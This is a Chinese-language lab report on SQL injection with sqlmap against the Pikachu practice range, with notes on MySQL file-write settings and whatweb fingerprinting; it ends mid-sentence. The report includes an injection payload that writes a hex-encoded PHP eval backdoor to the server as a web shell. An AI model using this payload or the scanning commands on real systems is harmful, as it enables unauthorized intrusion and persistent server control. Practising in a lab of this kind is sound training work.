1.实验报告–sqlmap

主要工具：sqlmap

环境：pikachu

期望：通过sql注入点 拿到一个web-shell

知识点：sqlmap使用 os-shell? sql命令写入文件

1.1 靶场环境安装

pikachu–

docker run -it pikachu:1.0
docker inspect pikachu_name					#找到ip

访问ip/install.php 进行初始化安装

万事大吉

1.2 sqlmap注入

sqlmap -u http://172.17.0.2/vul/sqli/sqli_id.php --forms

在想 能否结合爬虫工具 把所有sql注入的地方全扫一遍 并测试os-shell能否使用

1.3 os-shell使用

条件：

  1. 拥有数据库dba权限为True

  2. 知道网站的绝对路径

  3. PHP关闭魔术引号

  4. secure_file_priv= 值为空

    1.3.1 小皮不成功原因

    secure_file_priv 值未定义

    在 小皮安装目录下 

    C:\phpstudy_pro\Extensions\MySQL5.7.26\

    修改my.ini

    或在面板中

打开配置文件

在[mysqld]中

加入

secure_file_priv=""

在

C:\phpstudy_pro\Extensions\MySQL5.7.26\bin

打开终端

mysql -u root -p
show global variables like "%secure%";

出现该结果即可

?name=1'UNION SELECT 1,0x3c3f706870206576616c28245f504f53545b2770617373275d293b203f3e into outfile 'C:\\Phpstudy\\WWW\\pikachu\\vul\\sqli\\shell.php' --+&submit=查询

1.3.2docker 不成功

可参考：https://www.twblogs.net/a/5bf339febd9eee04040aaf34

2.指纹信息探测

用sqlmap也可以探测到一定的指纹信息 但只作为附带功能 不稳定

所谓指纹信息 分为

系统指纹探测

通过构造TCP/IP数据包发送到目的主机，根据操作系统对TCP/IP数据包的处理反馈的差异判断系统类型。

网络指纹探测

针对网络设备发送网络探测包，提取返回数据中的指纹信息，以此判断设备厂商、类型、端口、网络服务版本等。

Web指纹探测

针对Web站点发送网络探测包，提取网站架构、语言、Web服务的指纹信息，以此判断提供其类型和版本等

2.1 whatweb

Ruby开发 kali自带

参考https://blog.csdn.net/wangyuxiang946/article/details/130793160

1、WhatWeb主要参数 

指定网段：whatweb --no-errors 192.168.163.0/24 
文件加载扫描目标： whatweb –i “/home/user/targets.txt” 

扫描强度：-a，4中扫描级别，通过数字1~4选择，默认为1 
1：只会发送1次http请求。 
2：不可用，正在开发 
3：会发送少量http请求。 
4：会发送大量http请求，会尝试每一个插件。 


指定扫描前缀   whatweb --no-errors --url-prefix https:// 192.168.163.0/24 

查看插件 
查看全部插件： whatweb -l 
查看插件信息：whatweb --info-plugins="插件名"

1、WhatWeb主要参数
导出扫描结果： whatweb http://192.168.163.132/pikachu/ --log-json=result.json
--log-brief：简单的记录，每个网站只记录一条返回信息
--log-verbose： 输出详细信息
--log-xml：xml格式的日志
--log-json：json格式记录日志
--log-json-verbose： 详细的json日
